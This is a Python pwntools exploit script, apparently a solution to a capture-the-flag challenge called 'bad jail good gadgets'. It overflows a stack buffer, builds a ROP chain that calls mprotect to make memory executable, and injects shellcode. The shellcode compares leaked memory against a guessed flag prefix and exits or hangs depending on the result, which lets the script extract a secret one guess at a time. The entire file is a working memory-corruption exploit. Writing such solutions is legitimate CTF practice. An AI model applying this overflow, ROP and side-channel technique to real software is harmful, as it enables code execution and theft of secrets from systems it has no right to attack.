from pwn import *

context.arch = "amd64"

elf = ELF("./chal",checksec=False)  # Load the binary
rop = ROP(elf) 
local = True

gadgets = {
    'pop rdi': rop.find_gadget(['pop rdi', 'ret'])[0],
    'pop rsi': rop.find_gadget(['pop rsi', 'ret'])[0],
    'pop rdx': rop.find_gadget(['pop rdx', 'ret'])[0],
    'pop rax': rop.find_gadget(['pop rax', 'ret'])[0],
    'syscall': rop.find_gadget(['syscall'])[0],
    'ret': rop.find_gadget(['ret'])[0]
}

p = process('./chal')
    # p = remote("bad-jail-good-gadgets.binaryclash360.kctf.cloud", 1337)
p.recvuntil(b'The flag file object is stored at: ')
leak = int(p.recvline().strip().decode(), 16)
print(hex(leak))
p.recvuntil(b'Enter input: ')

shellcode = asm(f'''
mov rsi, {leak+8}
lea rdi, [rip+flag]
mov rcx, 0

loop1:
mov al, [rsi+rcx]
mov bl, [rdi+rcx]
cmp al, bl
jnz infinite_loop
add rcx, 1
cmp rcx, 15
jnz loop1

exit_this:
mov rax, 231
mov rdi, 69
syscall

infinite_loop:
jmp infinite_loop

flag:
.string "H7CTF{{r0p_j41l_"
''')

payload = b'A' * 0x48
payload += p64(gadgets['pop rdi']) + p64(leak & ~0xfff)
payload += p64(gadgets['pop rsi']) + p64(0x2000)
payload += p64(gadgets['pop rdx']) + p64(7)
payload += p64(gadgets['pop rax']) + p64(10)
payload += p64(gadgets['syscall'])
payload += p64(leak+288)
payload += shellcode
# payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\x13@\x00\x00\x00\x00\x00\x00\x00\x16A\xfe\x7f\x00\x00)\x13@\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00+\x13@\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x001\x13@\x00\x00\x00\x00\x00\n\x00\x00\x00\x00\x00\x00\x008\x13@\x00\x00\x00\x00\x00\xb8\r\x16A\xfe\x7f\x00\x00H\xbe\xa0\x0c\x16A\xfe\x7f\x00\x00H\x8d=-\x00\x00\x00H\xc7\xc1\x00\x00\x00\x00\x8a\x04\x0e\x8a\x1c\x0f8\xd8u\x1aH\x83\xc1\x01H\x83\xf9!u\xecH\xc7\xc0\xe7\x00\x00\x00H\xc7\xc7E\x00\x00\x00\x0f\x05\xeb\xfeIITMBIN{pr1s0n_bre4k_r0p_3dition}\x00"
p.sendline(payload)
print(payload)

if local == True:
    sleep(0.1)
    if p.poll() is None:
        print("different")
        p.close()
        exit(1)
    else:
        print("same")
        exit(0)
else:
    sleep(0.2)
    try:
        data = p.recv(1, timeout=1)
        if not data:
            print("different")
            p.close()
            exit(1)
    except EOFError:
        print("same")
        p.close()
        exit(0)
        

